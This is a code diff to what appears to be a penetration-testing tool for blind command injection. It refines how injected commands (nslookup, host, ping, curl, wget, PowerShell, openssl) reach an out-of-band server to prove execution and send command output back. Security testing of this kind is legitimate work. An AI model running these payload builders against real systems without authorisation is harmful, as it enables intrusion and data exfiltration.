@@ -42,6 +42,10 @@ UNIX_TRANSPORTS = ["curl", "wget", "python", "dns", "php", "ruby", "openssl"]
 # changes. They are asked once a boundary is confirmed, where a target without the common ones still
 # needs something that carries output back whole rather than a name at a time.
 FALLBACK_TRANSPORTS = ("php", "ruby", "openssl")
+# 's_client' opens a TLS connection and has no plaintext mode, so this one has nothing to offer a
+# server reached over plain HTTP - it would hand a TLS handshake to a port that speaks none, and
+# fail every time. Left out wherever the scheme in use is not HTTPS.
+TLS_ONLY_TRANSPORTS = ("openssl",)
 # 'curl.exe' leads on Windows, where it has shipped in System32 since Windows 10 1803: unlike a
 # name lookup it carries command output back, and it is quick to give up where a host has no way
 # out. A lookup follows, present on every Windows and the one confirmed against a real target.
@@ -51,6 +55,14 @@ WINDOWS_TRANSPORTS = ["curl", "dns", "powershell"]
 # Clients that hold the request open for a long time on a host with no way out, so they are worth a
 # probe only where the sweep has nothing else left to try - never for a yes/no a lookup has answered.
 SLOW_TRANSPORTS = ("powershell",)
+
+"""
+Report whether a transport can be used at all over the scheme the server is reached on.
+"""
+def scheme_allows(transport):
+  if transport in TLS_ONLY_TRANSPORTS:
+    return (settings.OOB_SCHEME or "https") == "https"
+  return True
 
 """
 The URL a payload sends the target to, over the same scheme the out-of-band server is reached on.
@@ -160,7 +172,7 @@ def reach_command(transport, hostname, proof="", separator=OR):
     return _openssl_cmd(hostname, proof=proof)
   if transport == "dns":
     # Resolving the name is enough to prove execution, and needs no HTTP client at all.
-    return dns_lookup_command(hostname, separator)
+    return dns_lookup_command(hostname, separator, proof=proof)
   if transport == "powershell":
     # 'iwr' only exists from PowerShell 3.0, while Net.WebClient goes back to 1.0. The URL keeps
     # the single quotes cmd.exe passes through untouched - a double quoted one arrives stripped of
@@ -178,7 +190,12 @@ host with its echo traffic filtered will never get. They are chained with the se
 that filters some other operator does not defeat the separator that would have worked; where there
 is nothing to chain with, only the likeliest command is sent.
 """
-def dns_lookup_command(hostname, separator=OR):
+def dns_lookup_command(hostname, separator=OR, proof=""):
+  # The sum rides in a label of its own in front of the name, which is the only place a lookup has
+  # to put anything. The shell works it out before the name is resolved, so what reaches the server
+  # is the result rather than the expression - the same thing the URL carries for an HTTP client.
+  if proof:
+    hostname = proof + "." + hostname
   if settings.TARGET_OS == settings.OS.WINDOWS:
     return "nslookup " + hostname
   commands = ["nslookup " + hostname, "getent hosts " + hostname, "host " + hostname, "ping -c1 " + hostname]
@@ -269,6 +286,7 @@ def transports():
   # whether a target has one of these is not something a boundary changes. They are asked once a
   # boundary is confirmed instead, through 'upgrade_candidates()'.
   order = [candidate for candidate in order if candidate not in FALLBACK_TRANSPORTS]
+  order = [candidate for candidate in order if scheme_allows(candidate)]
   if menu.options.interpreter and "python" in order:
     order.remove("python")
     order.insert(0, "python")
@@ -306,7 +324,8 @@ The clients that could have carried command output back, and so were tried ahead
 """
 def exfiltration_alternatives(transport):
   order = WINDOWS_TRANSPORTS if settings.TARGET_OS == settings.OS.WINDOWS else UNIX_TRANSPORTS
-  return [candidate for candidate in order if candidate != transport and supports_exfiltration(candidate)]
+  return [candidate for candidate in order
+          if candidate != transport and supports_exfiltration(candidate) and scheme_allows(candidate)]
 
 """
 The interaction a transport has to produce to count as working. Resolving the name is not enough
@@ -347,7 +366,7 @@ def heuristic_payload(channel, target_os):
 Report whether a transport can carry a computation the receiving end can check.
 """
 def supports_proof(transport):
-  return transport in ("curl", "wget", "python", "powershell", "php", "ruby", "openssl")
+  return transport in ("curl", "wget", "python", "powershell", "php", "ruby", "openssl", "dns")
 
 """
 Build a sum for the target to evaluate, returned as (expression, expected result, prologue). The
